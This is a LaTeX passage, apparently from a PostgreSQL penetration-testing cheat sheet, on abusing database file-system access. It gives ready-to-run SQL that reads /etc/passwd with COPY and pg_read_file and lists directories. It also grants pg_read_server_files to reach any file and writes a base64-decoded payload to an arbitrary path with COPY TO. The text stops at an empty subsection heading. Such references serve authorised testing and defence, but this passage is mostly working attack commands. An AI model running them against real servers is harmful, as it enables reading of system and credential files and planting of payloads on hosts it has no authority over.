\section{File-system actions}

\subsection{Read directories and files}
\begin{verbatim}
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
\end{verbatim}

There are other postgres functions that can be used to read file or list a directory. Only \verb+superusers+ and users with explicit permissions can use them (\url{ https://www.postgresql.org/docs/current/functions-admin.html}

\begin{verbatim}
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
\end{verbatim}


\subsection{Simple File Writing}
\begin{itemize}
    \item 
        \verb+COPY+ cannot handle newline chars, therefore even if you are using a base64 payload you need to send a one-liner.
    \item
        \verb+COPY+ cannot be used to write binary files as it modify some binary values.
\end{itemize}
\begin{verbatim}
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
\end{verbatim}


\subsection{Binary files upload}
\url{https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql}

\subsection{Updating PostgreSQL table data via local file write}
